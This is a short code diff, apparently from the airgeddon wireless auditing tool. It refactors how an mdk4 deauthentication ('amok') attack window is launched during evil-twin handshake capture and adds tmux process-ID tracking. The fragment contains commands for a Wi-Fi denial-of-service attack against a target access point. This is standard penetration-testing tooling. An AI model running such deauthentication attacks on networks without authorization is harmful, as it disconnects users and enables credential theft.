@@ -10115,6 +10115,8 @@ function capture_handshake_evil_twin() {
 
 	debug_print
 
+	local dos_cmd_line
+	local dos_pid
 	if ! validate_network_encryption_type "WPA"; then
 		return 1
 	fi
@@ -10127,7 +10129,15 @@ function capture_handshake_evil_twin() {
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
 			recalculate_windows_sizes
-			xterm +j -bg "#000000" -fg "#FF0000" -geometry "${g1_bottomleft_window}" -T "mdk4 amok attack" -e mdk4 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"mdk4 amok attack\"" "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "mdk4 amok attack"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				dos_cmd_line=$(echo "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}" | tr -d '"')
+				while [ -z "${dos_pid}" ]; do
+					dos_pid=$(ps --no-headers aux | grep "${dos_cmd_line}" | grep -v "grep ${dos_cmd_line}" | awk '{print $2}')
+				done
+				processidattack="${dos_pid}"
+			fi
+			#xterm +j -bg "#000000" -fg "#FF0000" -geometry "${g1_bottomleft_window}" -T "mdk4 amok attack" -e mdk4 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
 			sleeptimeattack=12
 		;;
 		"Aireplay")
